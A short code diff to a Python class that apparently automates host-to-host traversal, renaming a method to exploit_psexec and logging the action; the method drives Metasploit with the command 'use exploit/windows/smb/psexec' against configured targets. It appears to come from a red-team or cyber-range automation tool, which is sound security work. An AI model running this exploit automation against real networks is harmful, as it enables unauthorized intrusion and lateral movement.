@@ -16,12 +16,13 @@ class Traversal(object):
     """
     Defines a collection host traversal commands and exploits
     """
-    def psexec(self, target_name1, target_name2, verbose=True):
+    def exploit_psexec(self, target_name1, target_name2, verbose=True):
         """
         SMB server access
         """
         target1 = config.TARGETS[target_name1]
         target2 = config.TARGETS[target_name2]
+        target2.action_history.append("exploit_psexec")
         # setup exploit
         cmd = "use exploit/windows/smb/psexec"
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
